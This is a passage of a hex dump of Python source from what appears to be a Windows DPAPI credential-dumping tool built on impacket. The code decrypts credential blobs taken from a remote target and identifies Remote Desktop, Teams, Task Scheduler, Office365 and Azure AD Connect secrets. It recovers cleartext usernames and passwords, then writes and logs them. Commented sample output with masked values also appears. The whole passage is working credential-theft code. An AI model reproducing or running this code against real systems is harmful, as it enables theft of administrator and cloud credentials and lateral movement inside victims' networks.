+0000de80: 616c 6669 6c65 2c62 6c6f 625f 7479 7065  alfile,blob_type
+0000de90: 2c61 7267 733d 5b5d 293a 0a09 0974 7279  ,args=[]):...try
+0000dea0: 3a0a 0909 0973 656c 662e 6c6f 6767 696e  :....self.loggin
+0000deb0: 672e 6465 6275 6728 6622 5b7b 7365 6c66  g.debug(f"[{self
+0000dec0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+0000ded0: 6970 7d5d 205b 2b5d 2070 726f 6365 7373  ip}] [+] process
+0000dee0: 5f64 6563 7279 7074 6564 5f64 6174 6120  _decrypted_data 
+0000def0: 6f66 207b 7365 6372 6574 5f66 696c 657d  of {secret_file}
+0000df00: 207b 6263 6f6c 6f72 732e 454e 4443 7d22   {bcolors.ENDC}"
+0000df10: 290a 0909 0962 6c6f 625f 7479 7065 203d  )....blob_type =
+0000df20: 2073 6563 7265 745f 6669 6c65 5b27 7479   secret_file['ty
+0000df30: 7065 275d 0a09 0909 6c6f 6361 6c66 696c  pe']....localfil
+0000df40: 6520 3d20 7365 6372 6574 5f66 696c 655b  e = secret_file[
+0000df50: 2770 6174 6827 5d0a 0909 0964 6174 6120  'path']....data 
+0000df60: 3d20 7365 6372 6574 5f66 696c 655b 2764  = secret_file['d
+0000df70: 6174 6127 5d0a 0909 0969 6620 626c 6f62  ata']....if blob
+0000df80: 5f74 7970 6520 3d3d 2027 7264 6727 3a0a  _type == 'rdg':.
+0000df90: 0909 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+0000dfa0: 2e64 6562 7567 2822 4954 2053 2041 2052  .debug("IT S A R
+0000dfb0: 656d 6f74 6520 4465 736b 746f 7020 4372  emote Desktop Cr
+0000dfc0: 6564 2066 696c 6522 290a 0909 0909 636c  ed file").....cl
+0000dfd0: 6561 725f 6461 7461 203d 2073 656c 662e  ear_data = self.
+0000dfe0: 6475 6d70 5f63 7265 6465 6e74 6961 6c5f  dump_credential_
+0000dff0: 626c 6f62 2864 6174 6129 0a09 0909 656c  blob(data)....el
+0000e000: 6966 2062 6c6f 625f 7479 7065 203d 3d20  if blob_type == 
+0000e010: 2763 7265 6465 6e74 6961 6c27 3a0a 0a09  'credential':...
+0000e020: 0909 0969 6620 2744 6f6d 6169 6e3a 7461  ...if 'Domain:ta
+0000e030: 7267 6574 3d54 4552 4d53 5256 2720 696e  rget=TERMSRV' in
+0000e040: 2064 6174 615b 2754 6172 6765 7427 5d2e   data['Target'].
+0000e050: 6465 636f 6465 2827 7574 662d 3136 6c65  decode('utf-16le
+0000e060: 2729 206f 7220 274c 6567 6163 7947 656e  ') or 'LegacyGen
+0000e070: 6572 6963 3a74 6172 6765 743d 5445 524d  eric:target=TERM
+0000e080: 5352 5627 2069 6e20 5c0a 0909 0909 0909  SRV' in \.......
+0000e090: 6461 7461 5b27 5461 7267 6574 275d 2e64  data['Target'].d
+0000e0a0: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
+0000e0b0: 293a 0a09 0909 0909 636c 6561 725f 6461  ):......clear_da
+0000e0c0: 7461 203d 2073 656c 662e 6475 6d70 5f43  ta = self.dump_C
+0000e0d0: 5245 4445 4e54 4941 4c5f 5453 4528 7573  REDENTIAL_TSE(us
+0000e0e0: 6572 2c20 6c6f 6361 6c66 696c 652c 2064  er, localfile, d
+0000e0f0: 6174 6129 0a09 0909 0965 6c69 6620 2744  ata).....elif 'D
+0000e100: 6f6d 6169 6e3a 7461 7267 6574 3d6d 7374  omain:target=mst
+0000e110: 6561 6d73 2720 696e 2064 6174 615b 2754  eams' in data['T
+0000e120: 6172 6765 7427 5d2e 6465 636f 6465 2827  arget'].decode('
+0000e130: 7574 662d 3136 6c65 2729 206f 7220 274c  utf-16le') or 'L
+0000e140: 6567 6163 7947 656e 6572 6963 3a74 6172  egacyGeneric:tar
+0000e150: 6765 743d 6d73 7465 616d 7327 2069 6e20  get=msteams' in 
+0000e160: 5c0a 0909 0909 0909 6461 7461 5b27 5461  \.......data['Ta
+0000e170: 7267 6574 275d 2e64 6563 6f64 6528 2775  rget'].decode('u
+0000e180: 7466 2d31 366c 6527 293a 0a09 0909 0909  tf-16le'):......
+0000e190: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0000e1a0: 7567 2822 4954 2053 2041 204d 5354 6561  ug("IT S A MSTea
+0000e1b0: 6d20 4372 6564 656e 7469 616c 2122 290a  m Credential!").
+0000e1c0: 0909 0909 0963 6c65 6172 5f64 6174 6120  .....clear_data 
+0000e1d0: 3d20 7365 6c66 2e64 756d 705f 4352 4544  = self.dump_CRED
+0000e1e0: 454e 5449 414c 5f54 5345 2875 7365 722c  ENTIAL_TSE(user,
+0000e1f0: 206c 6f63 616c 6669 6c65 2c20 6461 7461   localfile, data
+0000e200: 290a 0909 0909 656c 6966 2027 446f 6d61  ).....elif 'Doma
+0000e210: 696e 3a62 6174 6368 3d54 6173 6b53 6368  in:batch=TaskSch
+0000e220: 6564 756c 6572 2720 696e 2064 6174 615b  eduler' in data[
+0000e230: 2754 6172 6765 7427 5d2e 6465 636f 6465  'Target'].decode
+0000e240: 280a 0909 0909 0909 2775 7466 2d31 366c  (.......'utf-16l
+0000e250: 6527 2920 6f72 2027 4c65 6761 6379 4765  e') or 'LegacyGe
+0000e260: 6e65 7269 633a 7461 7267 6574 3d6d 7374  neric:target=mst
+0000e270: 6561 6d73 2720 696e 2064 6174 615b 2754  eams' in data['T
+0000e280: 6172 6765 7427 5d2e 6465 636f 6465 2827  arget'].decode('
+0000e290: 7574 662d 3136 6c65 2729 3a0a 0909 0909  utf-16le'):.....
+0000e2a0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+0000e2b0: 6275 6728 2249 5420 5320 4120 5461 736b  bug("IT S A Task
+0000e2c0: 5363 6865 6475 6c65 7220 4372 6564 2122  Scheduler Cred!"
+0000e2d0: 290a 0909 0909 0963 6c65 6172 5f64 6174  )......clear_dat
+0000e2e0: 6120 3d20 7365 6c66 2e64 756d 705f 4352  a = self.dump_CR
+0000e2f0: 4544 454e 5449 414c 5f54 4153 4b53 4348  EDENTIAL_TASKSCH
+0000e300: 4544 554c 4552 2875 7365 722c 206c 6f63  EDULER(user, loc
+0000e310: 616c 6669 6c65 2c20 6461 7461 290a 0909  alfile, data)...
+0000e320: 0909 0927 2727 446f 6d61 696e 3a62 6174  ...'''Domain:bat
+0000e330: 6368 3d54 6173 6b53 6368 6564 756c 6572  ch=TaskScheduler
+0000e340: 3a54 6173 6b3a 7b33 3133 3638 3639 352d  :Task:{31368695-
+0000e350: 7878 7878 7878 7878 7878 787d 0a09 0909  xxxxxxxxxxx}....
+0000e360: 0909 5573 6572 6e61 6d65 2020 2020 3a20  ..Username    : 
+0000e370: 446f 6d61 696e 5c41 646d 696e 6973 7472  Domain\Administr
+0000e380: 6174 6575 720a 0909 0909 0955 6e6b 6e6f  ateur......Unkno
+0000e390: 776e 3320 2020 2020 3a20 4026 2626 2626  wn3     : @&&&&&
+0000e3a0: 2626 0a09 0909 0909 2727 270a 0909 0909  &&......'''.....
+0000e3b0: 656c 6966 2027 446f 6d61 696e 3a74 6172  elif 'Domain:tar
+0000e3c0: 6765 743d 4d69 6372 6f73 6f66 744f 6666  get=MicrosoftOff
+0000e3d0: 6963 6531 365f 4461 7461 3a6f 7267 6964  ice16_Data:orgid
+0000e3e0: 2720 696e 2064 6174 615b 2754 6172 6765  ' in data['Targe
+0000e3f0: 7427 5d2e 6465 636f 6465 280a 0909 0909  t'].decode(.....
+0000e400: 0909 2775 7466 2d31 366c 6527 2920 6f72  ..'utf-16le') or
+0000e410: 2027 4c65 6761 6379 4765 6e65 7269 633a   'LegacyGeneric:
+0000e420: 7461 7267 6574 3d4d 6963 726f 736f 6674  target=Microsoft
+0000e430: 4f66 6669 6365 3136 5f44 6174 613a 6f72  Office16_Data:or
+0000e440: 6769 6427 2069 6e20 6461 7461 5b27 5461  gid' in data['Ta
+0000e450: 7267 6574 275d 2e64 6563 6f64 6528 0a09  rget'].decode(..
+0000e460: 0909 0909 0927 7574 662d 3136 6c65 2729  .....'utf-16le')
+0000e470: 3a0a 0909 0909 0973 656c 662e 6c6f 6767  :......self.logg
+0000e480: 696e 672e 6465 6275 6728 2249 5420 5320  ing.debug("IT S 
+0000e490: 4120 4f66 6669 6365 3336 3520 4372 6564  A Office365 Cred
+0000e4a0: 2122 290a 0909 0909 0963 6c65 6172 5f64  !")......clear_d
+0000e4b0: 6174 6120 3d20 7365 6c66 2e64 756d 705f  ata = self.dump_
+0000e4c0: 4352 4544 454e 5449 414c 5f54 5345 2875  CREDENTIAL_TSE(u
+0000e4d0: 7365 722c 206c 6f63 616c 6669 6c65 2c20  ser, localfile, 
+0000e4e0: 6461 7461 290a 0909 0909 0927 2727 0a09  data)......'''..
+0000e4f0: 0909 0909 0909 0909 5b43 5245 4445 4e54  ........[CREDENT
+0000e500: 4941 4c5d 0a09 0909 0909 4c61 7374 5772  IAL]......LastWr
+0000e510: 6974 7465 6e20 3a20 3230 3230 2d30 322d  itten : 2020-02-
+0000e520: 3138 2030 383a 3438 3a33 390a 0909 0909  18 08:48:39.....
+0000e530: 0946 6c61 6773 2020 2020 2020 203a 2034  .Flags       : 4
+0000e540: 3820 2843 5245 445f 464c 4147 535f 5245  8 (CRED_FLAGS_RE
+0000e550: 5155 4952 455f 434f 4e46 4952 4d41 5449  QUIRE_CONFIRMATI
+0000e560: 4f4e 7c43 5245 445f 464c 4147 535f 5749  ON|CRED_FLAGS_WI
+0000e570: 4c44 4341 5244 5f4d 4154 4348 290a 0909  LDCARD_MATCH)...
+0000e580: 0909 0950 6572 7369 7374 2020 2020 203a  ...Persist     :
+0000e590: 2030 7833 2028 4352 4544 5f50 4552 5349   0x3 (CRED_PERSI
+0000e5a0: 5354 5f45 4e54 4552 5052 4953 4529 0a09  ST_ENTERPRISE)..
+0000e5b0: 0909 0909 5479 7065 2020 2020 2020 2020  ....Type        
+0000e5c0: 3a20 3078 3120 2843 5245 445f 5045 5253  : 0x1 (CRED_PERS
+0000e5d0: 4953 545f 5345 5353 494f 4e29 0a09 0909  IST_SESSION)....
+0000e5e0: 0909 5461 7267 6574 2020 2020 2020 3a20  ..Target      : 
+0000e5f0: 4c65 6761 6379 4765 6e65 7269 633a 7461  LegacyGeneric:ta
+0000e600: 7267 6574 3d4d 6963 726f 736f 6674 4f66  rget=MicrosoftOf
+0000e610: 6669 6365 3135 5f44 6174 613a 5353 5049  fice15_Data:SSPI
+0000e620: 3a76 2e78 7878 7878 7878 4078 7878 7878  :v.xxxxxxx@xxxxx
+0000e630: 782e 636f 6d0a 0909 0909 0944 6573 6372  x.com......Descr
+0000e640: 6970 7469 6f6e 203a 200a 0909 0909 0955  iption : ......U
+0000e650: 6e6b 6e6f 776e 2020 2020 203a 200a 0909  nknown     : ...
+0000e660: 0909 0955 7365 726e 616d 6520 2020 203a  ...Username    :
+0000e670: 200a 0909 0909 0955 6e6b 6e6f 776e 3320   ......Unknown3 
+0000e680: 2020 2020 3a20 7878 7878 7878 7878 780a      : xxxxxxxxx.
+0000e690: 0a0a 0a09 0909 0909 2727 270a 0909 0909  ........'''.....
+0000e6a0: 656c 6966 2027 5769 6e64 6f77 734c 6976  elif 'WindowsLiv
+0000e6b0: 653a 7461 7267 6574 3d76 6972 7475 616c  e:target=virtual
+0000e6c0: 6170 702f 6469 646c 6f67 6963 616c 2720  app/didlogical' 
+0000e6d0: 696e 2064 6174 615b 2754 6172 6765 7427  in data['Target'
+0000e6e0: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
+0000e6f0: 6c65 2729 3a0a 0909 0909 0973 656c 662e  le'):......self.
+0000e700: 6c6f 6767 696e 672e 6465 6275 6728 2249  logging.debug("I
+0000e710: 5420 5320 4120 5769 6e64 6f77 7320 4c69  T S A Windows Li
+0000e720: 7665 2073 6572 7669 6365 206f 7220 6170  ve service or ap
+0000e730: 706c 6963 6174 696f 6e20 4372 6564 2122  plication Cred!"
+0000e740: 290a 0909 0909 0963 6c65 6172 5f64 6174  )......clear_dat
+0000e750: 6120 3d20 7365 6c66 2e64 756d 705f 6372  a = self.dump_cr
+0000e760: 6564 656e 7469 616c 5f62 6c6f 6228 7573  edential_blob(us
+0000e770: 6572 2c20 6c6f 6361 6c66 696c 652c 2064  er, localfile, d
+0000e780: 6174 6129 0a09 0909 0923 2041 4443 4f4e  ata).....# ADCON
+0000e790: 4e45 4354 0a09 0909 0965 6c69 6620 274d  NECT.....elif 'M
+0000e7a0: 6963 726f 736f 6674 5f41 7a75 7265 4144  icrosoft_AzureAD
+0000e7b0: 436f 6e6e 6563 745f 4b65 7953 6574 2720  Connect_KeySet' 
+0000e7c0: 696e 2064 6174 615b 2754 6172 6765 7427  in data['Target'
+0000e7d0: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
+0000e7e0: 6c65 2729 3a0a 0909 0909 0973 656c 662e  le'):......self.
+0000e7f0: 6c6f 6767 696e 672e 6465 6275 6728 6622  logging.debug(f"
+0000e800: 7b62 636f 6c6f 7273 2e57 4152 4e49 4e47  {bcolors.WARNING
+0000e810: 7d49 5420 5320 4120 4d69 6372 6f73 6f66  }IT S A Microsof
+0000e820: 745f 417a 7572 6541 4443 6f6e 6e65 6374  t_AzureADConnect
+0000e830: 5f4b 6579 5365 7420 4372 6564 217b 6263  _KeySet Cred!{bc
+0000e840: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+0000e850: 0909 0963 6c65 6172 5f64 6174 6120 3d20  ...clear_data = 
+0000e860: 7365 6c66 2e47 6574 5f41 445f 436f 6e6e  self.Get_AD_Conn
+0000e870: 6563 7428 7573 6572 2c20 6c6f 6361 6c66  ect(user, localf
+0000e880: 696c 652c 2064 6174 6129 0a09 0909 0965  ile, data).....e
+0000e890: 6c69 6620 274c 6567 6163 7947 656e 6572  lif 'LegacyGener
+0000e8a0: 6963 3a74 6172 6765 743d 2720 696e 2064  ic:target=' in d
+0000e8b0: 6174 615b 2754 6172 6765 7427 5d2e 6465  ata['Target'].de
+0000e8c0: 636f 6465 2827 7574 662d 3136 6c65 2729  code('utf-16le')
+0000e8d0: 3a20 2023 2041 7574 7265 7320 5461 7267  :  # Autres Targ
+0000e8e0: 6574 730a 0909 0909 0973 656c 662e 6c6f  ets......self.lo
+0000e8f0: 6767 696e 672e 6465 6275 6728 224f 7468  gging.debug("Oth
+0000e900: 6572 206c 6567 6163 7920 4372 6564 656e  er legacy Creden
+0000e910: 7469 616c 2229 0a09 0909 0909 636c 6561  tial")......clea
+0000e920: 725f 6461 7461 203d 2073 656c 662e 6475  r_data = self.du
+0000e930: 6d70 5f63 7265 6465 6e74 6961 6c5f 626c  mp_credential_bl
+0000e940: 6f62 2875 7365 722c 206c 6f63 616c 6669  ob(user, localfi
+0000e950: 6c65 2c20 6461 7461 290a 0909 0909 656c  le, data).....el
+0000e960: 7365 3a0a 0909 0909 0973 656c 662e 6c6f  se:......self.lo
+0000e970: 6767 696e 672e 6465 6275 6728 2255 6e6b  gging.debug("Unk
+0000e980: 6e6f 776e 2043 7265 6420 5461 7267 6574  nown Cred Target
+0000e990: 2063 6f6e 7465 6e74 202d 2074 6573 7469   content - testi
+0000e9a0: 6e67 2061 7320 4372 6564 656e 7469 616c  ng as Credential
+0000e9b0: 2042 4c4f 4222 290a 0909 0909 0963 6c65   BLOB")......cle
+0000e9c0: 6172 5f64 6174 6120 3d20 7365 6c66 2e64  ar_data = self.d
+0000e9d0: 756d 705f 6372 6564 656e 7469 616c 5f62  ump_credential_b
+0000e9e0: 6c6f 6228 7573 6572 2c20 6c6f 6361 6c66  lob(user, localf
+0000e9f0: 696c 652c 2064 6174 6129 0a09 0909 0923  ile, data).....#
+0000ea00: 2063 6c65 6172 5f64 6174 6120 3d20 2727   clear_data = ''
+0000ea10: 0a09 0909 0973 6563 7265 745f 6669 6c65  .....secret_file
+0000ea20: 5b27 7365 6372 6574 275d 203d 2063 6c65  ['secret'] = cle
+0000ea30: 6172 5f64 6174 610a 0909 0909 7365 6c66  ar_data.....self
+0000ea40: 2e64 756d 705f 746f 5f66 696c 6528 6c6f  .dump_to_file(lo
+0000ea50: 6361 6c66 696c 652c 2063 6c65 6172 5f64  calfile, clear_d
+0000ea60: 6174 6129 0a09 0909 0973 656c 662e 6c6f  ata).....self.lo
+0000ea70: 6773 6563 7265 7428 636c 6561 725f 6461  gsecret(clear_da
+0000ea80: 7461 290a 0a09 0923 2054 5345 2041 6363  ta)....# TSE Acc
+0000ea90: 6f75 6e74 0a09 0965 7863 6570 7420 4578  ount...except Ex
+0000eaa0: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
+0000eab0: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+0000eac0: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
+0000ead0: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+0000eae0: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+0000eaf0: 5741 524e 494e 477d 4578 6365 7074 2032  WARNING}Except 2
+0000eb00: 2070 726f 6365 7373 5f64 6563 7279 7074   process_decrypt
+0000eb10: 6564 5f64 6174 6120 414c 4c20 666f 7220  ed_data ALL for 
+0000eb20: 7b6c 6f63 616c 6669 6c65 7d20 7b62 636f  {localfile} {bco
+0000eb30: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+0000eb40: 7365 6c66 2e6c 6f67 6769 6e67 2e64 6562  self.logging.deb
+0000eb50: 7567 2865 7829 0a0a 0964 6566 2064 756d  ug(ex)...def dum
+0000eb60: 705f 6372 6564 656e 7469 616c 5f62 6c6f  p_credential_blo
+0000eb70: 6228 7365 6c66 2c20 7573 6572 2c20 6c6f  b(self, user, lo
+0000eb80: 6361 6c66 696c 652c 2064 6563 7279 7074  calfile, decrypt
+0000eb90: 6564 5f62 6c6f 6229 3a0a 0909 2320 6672  ed_blob):...# fr
+0000eba0: 6f6d 2069 6d70 6163 6b65 742e 6573 6520  om impacket.ese 
+0000ebb0: 696d 706f 7274 2067 6574 556e 6978 5469  import getUnixTi
+0000ebc0: 6d65 0a09 0974 7279 3a0a 0909 0973 656c  me...try:....sel
+0000ebd0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+0000ebe0: 2244 756d 7069 6e67 2064 6563 7279 7074  "Dumping decrypt
+0000ebf0: 6564 2063 7265 6465 6e74 6961 6c20 626c  ed credential bl
+0000ec00: 6f62 2069 6e66 6f20 746f 2066 696c 6522  ob info to file"
+0000ec10: 290a 0909 0923 2073 656c 662e 6c6f 6767  )....# self.logg
+0000ec20: 696e 672e 6465 6275 6728 6465 6372 7970  ing.debug(decryp
+0000ec30: 7465 645f 626c 6f62 290a 0909 0969 6e66  ted_blob)....inf
+0000ec40: 6f20 3d20 225c 6e22 0a09 0909 696e 666f  o = "\n"....info
+0000ec50: 202b 3d20 6622 5b43 5245 4445 4e54 4941   += f"[CREDENTIA
+0000ec60: 4c5d 5c6e 220a 0909 0974 7279 3a0a 0909  L]\n"....try:...
+0000ec70: 0909 696e 666f 202b 3d20 6622 4c61 7374  ..info += f"Last
+0000ec80: 5772 6974 7465 6e20 3a20 7b64 6174 6574  Written : {datet
+0000ec90: 696d 652e 7574 6366 726f 6d74 696d 6573  ime.utcfromtimes
+0000eca0: 7461 6d70 2869 6d70 6163 6b65 742e 6470  tamp(impacket.dp
+0000ecb0: 6170 692e 6765 7455 6e69 7854 696d 6528  api.getUnixTime(
+0000ecc0: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+0000ecd0: 4c61 7374 5772 6974 7465 6e27 5d29 297d  LastWritten']))}
+0000ece0: 5c6e 220a 0909 0909 696e 666f 202b 3d20  \n".....info += 
+0000ecf0: 6622 466c 6167 7320 2020 2020 2020 3a20  f"Flags       : 
+0000ed00: 7b64 6563 7279 7074 6564 5f62 6c6f 625b  {decrypted_blob[
+0000ed10: 2746 6c61 6773 275d 7d20 287b 696d 7061  'Flags']} ({impa
+0000ed20: 636b 6574 2e64 7061 7069 2e67 6574 466c  cket.dpapi.getFl
+0000ed30: 6167 7328 696d 7061 636b 6574 2e64 7061  ags(impacket.dpa
+0000ed40: 7069 2e43 5245 4445 4e54 4941 4c5f 464c  pi.CREDENTIAL_FL
+0000ed50: 4147 532c 2064 6563 7279 7074 6564 5f62  AGS, decrypted_b
+0000ed60: 6c6f 625b 2746 6c61 6773 275d 297d 295c  lob['Flags'])})\
+0000ed70: 6e22 0a09 0909 0969 6e66 6f20 2b3d 2066  n".....info += f
+0000ed80: 2250 6572 7369 7374 2020 2020 203a 2030  "Persist     : 0
+0000ed90: 787b 6465 6372 7970 7465 645f 626c 6f62  x{decrypted_blob
+0000eda0: 5b27 5065 7273 6973 7427 5d7d 2028 7b69  ['Persist']} ({i
+0000edb0: 6d70 6163 6b65 742e 6470 6170 692e 4352  mpacket.dpapi.CR
+0000edc0: 4544 454e 5449 414c 5f50 4552 5349 5354  EDENTIAL_PERSIST
+0000edd0: 2864 6563 7279 7074 6564 5f62 6c6f 625b  (decrypted_blob[
+0000ede0: 2750 6572 7369 7374 275d 292e 6e61 6d65  'Persist']).name
+0000edf0: 7d29 5c6e 220a 0909 0909 696e 666f 202b  })\n".....info +
+0000ee00: 3d20 6622 5479 7065 2020 2020 2020 2020  = f"Type        
+0000ee10: 3a20 3078 7b64 6563 7279 7074 6564 5f62  : 0x{decrypted_b
+0000ee20: 6c6f 625b 2754 7970 6527 5d7d 2028 7b69  lob['Type']} ({i
+0000ee30: 6d70 6163 6b65 742e 6470 6170 692e 4352  mpacket.dpapi.CR
+0000ee40: 4544 454e 5449 414c 5f50 4552 5349 5354  EDENTIAL_PERSIST
+0000ee50: 2864 6563 7279 7074 6564 5f62 6c6f 625b  (decrypted_blob[
+0000ee60: 2754 7970 6527 5d29 2e6e 616d 657d 295c  'Type']).name})\
+0000ee70: 6e22 0a09 0909 0973 656c 662e 6c6f 6767  n".....self.logg
+0000ee80: 696e 672e 6465 6275 6728 696e 666f 290a  ing.debug(info).
+0000ee90: 0909 0965 7863 6570 7420 4578 6365 7074  ...except Except
+0000eea0: 696f 6e20 6173 2065 783a 0a09 0909 0973  ion as ex:.....s
+0000eeb0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000eec0: 6728 0a09 0909 0909 6622 5b7b 7365 6c66  g(......f"[{self
+0000eed0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+0000eee0: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
+0000eef0: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
+0000ef00: 3120 6465 6372 7970 7465 645f 626c 6f62  1 decrypted_blob
+0000ef10: 2e61 7474 7269 6275 7465 7320 7b62 636f  .attributes {bco
+0000ef20: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+0000ef30: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+0000ef40: 6275 6728 6578 290a 0909 0969 6e66 6f20  bug(ex)....info 
+0000ef50: 2b3d 2066 2254 6172 6765 7420 2020 2020  += f"Target     
+0000ef60: 203a 207b 6465 6372 7970 7465 645f 626c   : {decrypted_bl
+0000ef70: 6f62 5b27 5461 7267 6574 275d 2e64 6563  ob['Target'].dec
+0000ef80: 6f64 6528 2775 7466 2d31 366c 6527 297d  ode('utf-16le')}
+0000ef90: 5c6e 220a 0909 0969 6e66 6f20 2b3d 2066  \n"....info += f
+0000efa0: 2244 6573 6372 6970 7469 6f6e 203a 207b  "Description : {
+0000efb0: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+0000efc0: 4465 7363 7269 7074 696f 6e27 5d2e 6465  Description'].de
+0000efd0: 636f 6465 2827 7574 662d 3136 6c65 2729  code('utf-16le')
+0000efe0: 7d5c 6e22 0a09 0909 696e 666f 202b 3d20  }\n"....info += 
+0000eff0: 6622 556e 6b6e 6f77 6e20 2020 2020 3a20  f"Unknown     : 
+0000f000: 7b64 6563 7279 7074 6564 5f62 6c6f 625b  {decrypted_blob[
+0000f010: 2755 6e6b 6e6f 776e 275d 2e64 6563 6f64  'Unknown'].decod
+0000f020: 6528 2775 7466 2d31 366c 6527 297d 5c6e  e('utf-16le')}\n
+0000f030: 220a 0909 0969 6e66 6f20 2b3d 2066 2255  "....info += f"U
+0000f040: 7365 726e 616d 6520 2020 203a 207b 6465  sername    : {de
+0000f050: 6372 7970 7465 645f 626c 6f62 5b27 5573  crypted_blob['Us
+0000f060: 6572 6e61 6d65 275d 2e64 6563 6f64 6528  ername'].decode(
+0000f070: 2775 7466 2d31 366c 6527 297d 5c6e 220a  'utf-16le')}\n".
+0000f080: 0909 0974 7279 3a0a 0909 0909 696e 666f  ...try:.....info
+0000f090: 202b 3d20 6622 556e 6b6e 6f77 6e33 2020   += f"Unknown3  
+0000f0a0: 2020 203a 207b 6465 6372 7970 7465 645f     : {decrypted_
+0000f0b0: 626c 6f62 5b27 556e 6b6e 6f77 6e33 275d  blob['Unknown3']
+0000f0c0: 2e64 6563 6f64 6528 2775 7466 2d31 366c  .decode('utf-16l
+0000f0d0: 6527 297d 5c6e 220a 0909 0909 7061 7373  e')}\n".....pass
+0000f0e0: 776f 7264 203d 2066 227b 6465 6372 7970  word = f"{decryp
+0000f0f0: 7465 645f 626c 6f62 5b27 556e 6b6e 6f77  ted_blob['Unknow
+0000f100: 6e33 275d 2e64 6563 6f64 6528 2775 7466  n3'].decode('utf
+0000f110: 2d31 366c 6527 297d 220a 0909 0965 7863  -16le')}"....exc
+0000f120: 6570 7420 556e 6963 6f64 6544 6563 6f64  ept UnicodeDecod
+0000f130: 6545 7272 6f72 3a0a 0909 0909 696e 666f  eError:.....info
+0000f140: 202b 3d20 6622 556e 6b6e 6f77 6e33 2e20   += f"Unknown3. 
+0000f150: 2020 2020 3a20 7b64 6563 7279 7074 6564      : {decrypted
+0000f160: 5f62 6c6f 625b 2755 6e6b 6e6f 776e 3327  _blob['Unknown3'
+0000f170: 5d2e 6465 636f 6465 2827 6c61 7469 6e2d  ].decode('latin-
+0000f180: 3127 297d 5c6e 220a 0909 0909 7061 7373  1')}\n".....pass
+0000f190: 776f 7264 203d 2066 227b 6465 6372 7970  word = f"{decryp
+0000f1a0: 7465 645f 626c 6f62 5b27 556e 6b6e 6f77  ted_blob['Unknow
+0000f1b0: 6e33 275d 2e64 6563 6f64 6528 276c 6174  n3'].decode('lat
+0000f1c0: 696e 2d31 2729 7d22 0a09 0909 2320 7072  in-1')}"....# pr
+0000f1d0: 696e 7428 290a 0909 0969 6620 2257 696e  int()....if "Win
+0000f1e0: 646f 7773 4c69 7665 3a74 6172 6765 743d  dowsLive:target=
+0000f1f0: 7669 7274 7561 6c61 7070 2220 6e6f 7420  virtualapp" not 
+0000f200: 696e 2066 227b 6465 6372 7970 7465 645f  in f"{decrypted_
+0000f210: 626c 6f62 5b27 5461 7267 6574 275d 2e64  blob['Target'].d
+0000f220: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
+0000f230: 297d 223a 2020 2320 2257 696e 646f 7773  )}":  # "Windows
+0000f240: 4c69 7665 3a74 6172 6765 743d 7669 7274  Live:target=virt
+0000f250: 7561 6c61 7070 2f64 6964 6c6f 6769 6361  ualapp/didlogica
+0000f260: 6c22 204f 6e20 6e65 2067 6572 6520 7061  l" On ne gere pa
+0000f270: 7320 706f 7572 206c 6520 6d6f 6d65 6e74  s pour le moment
+0000f280: 2f2f 2041 2076 6f69 7220 706f 7572 2072  // A voir pour r
+0000f290: 6173 7365 6d62 6c65 7220 6c65 2063 6f6e  assembler le con
+0000f2a0: 7465 6e75 2065 6e20 3120 6e6f 7576 6561  tenu en 1 nouvea
+0000f2b0: 7520 626c 6f62 203f 0a09 0909 0966 6f72  u blob ?.....for
+0000f2c0: 2065 6e74 7279 2069 6e20 6465 6372 7970   entry in decryp
+0000f2d0: 7465 645f 626c 6f62 2e61 7474 7269 6275  ted_blob.attribu
+0000f2e0: 7465 733a 0a09 0909 0909 7472 793a 0a09  tes:......try:..
+0000f2f0: 0909 0909 0969 6e66 6f20 2b3d 2066 224b  .....info += f"K
+0000f300: 6579 576f 7264 203a 207b 656e 7472 795b  eyWord : {entry[
+0000f310: 274b 6579 576f 7264 275d 2e64 6563 6f64  'KeyWord'].decod
+0000f320: 6528 2775 7466 2d31 366c 6527 297d 5c6e  e('utf-16le')}\n
+0000f330: 220a 0909 0909 0909 696e 666f 202b 3d20  ".......info += 
+0000f340: 6622 466c 6167 7320 2020 3a20 7b65 6e74  f"Flags   : {ent
+0000f350: 7279 5b27 466c 6167 7327 5d7d 2c20 7b69  ry['Flags']}, {i
+0000f360: 6d70 6163 6b65 742e 6470 6170 692e 6765  mpacket.dpapi.ge
+0000f370: 7446 6c61 6773 2843 5245 4445 4e54 4941  tFlags(CREDENTIA
+0000f380: 4c5f 464c 4147 532c 2065 6e74 7279 5b27  L_FLAGS, entry['
+0000f390: 466c 6167 7327 5d29 7d5c 6e22 0a09 0909  Flags'])}\n"....
+0000f3a0: 0909 0969 6e66 6f20 2b3d 2066 2244 6174  ...info += f"Dat
+0000f3b0: 6120 2020 203a 207b 656e 7472 795b 2744  a    : {entry['D
+0000f3c0: 6174 6127 5d7d 5c6e 220a 0909 0909 0965  ata']}\n"......e
+0000f3d0: 7863 6570 7420 4578 6365 7074 696f 6e20  xcept Exception 
